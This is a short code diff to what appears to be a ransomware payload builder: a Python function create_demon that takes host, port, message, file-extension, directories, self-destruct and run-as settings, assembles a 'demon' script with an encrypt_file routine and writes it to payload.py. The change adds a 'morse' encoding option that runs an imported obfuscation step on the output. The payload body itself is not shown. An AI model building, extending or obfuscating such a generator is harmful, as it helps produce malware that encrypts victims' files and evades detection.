@@ -1,6 +1,7 @@
 import platform
+from src.morse_encoder import morse
 
-def create_demon(host, port, fullscreen, demo, type, method, msg, img_base64, mode, debug, ext, dirs, destruct, working_dir, runas):
+def create_demon(host, port, fullscreen, demo, type, method, msg, img_base64, mode, debug, ext, dirs, destruct, working_dir, runas, encoding):
     demon = """import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time, base64
 <import_pil>
 from pathlib import Path
@@ -372,3 +373,6 @@ def encrypt_file(file_name, key):
     with open('./payload.py', 'w') as f:
         f.write(demon)
         f.close()
+
+    if encoding == 'morse':
+        morse()
